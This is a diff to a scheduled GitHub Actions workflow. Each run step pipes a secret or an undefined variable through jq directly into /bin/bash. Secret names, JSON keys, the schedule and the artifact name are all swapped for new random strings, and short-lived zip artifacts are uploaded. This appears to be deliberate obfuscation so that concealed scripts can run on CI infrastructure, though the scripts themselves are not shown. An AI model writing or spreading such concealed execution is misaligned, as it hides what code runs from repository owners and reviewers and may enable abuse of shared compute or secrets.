@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '4 0,6,12,18 * * *'
+    - cron: '13 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,21 +18,20 @@ jobs:
           fetch-depth: 1
       - name: Invoke
         env:
-          epfpf483: ${{ secrets.epfpf483 }}
+          voxz608: ${{ secrets.voxz608 }}
         run: |
-          printf '%s' "$epfpf483" | jq -r .jwqnc1 | /bin/bash
-          echo $xg6740 | jq -r .hlz451 | /bin/bash
-          echo $rblrs831 | jq -r .wmyip251 | /bin/bash
-          printf '%s' "$shl4340" | jq -r .csdoa7489 | /bin/bash
-          printf '%s' "$qavj457" | jq -r .j7746 | /bin/bash
-          printf '%s' "$c68666" | jq -r .xw854 | /bin/bash
-          echo $xuwhw475 | jq -r .o291 | /bin/bash
-          printf '%s' "$sy17" | jq -r .kf3456 | /bin/bash
+          printf '%s' "$voxz608" | jq -r .aw5 | /bin/bash
+          echo $zotz98546 | jq -r .b709 | /bin/bash
+          printf '%s' "$j9944" | jq -r .tn0 | /bin/bash
+          printf '%s' "$wz798" | jq -r .plu8 | /bin/bash
+          printf '%s' "$bxocl4" | jq -r .oih3 | /bin/bash
+          printf '%s' "$v78196" | jq -r .nhux0 | /bin/bash
+          echo $sst1 | jq -r .yc8 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: xofNwKi7
+          name: qKfix8gC
           path: "*.zip"
           retention-days: 1
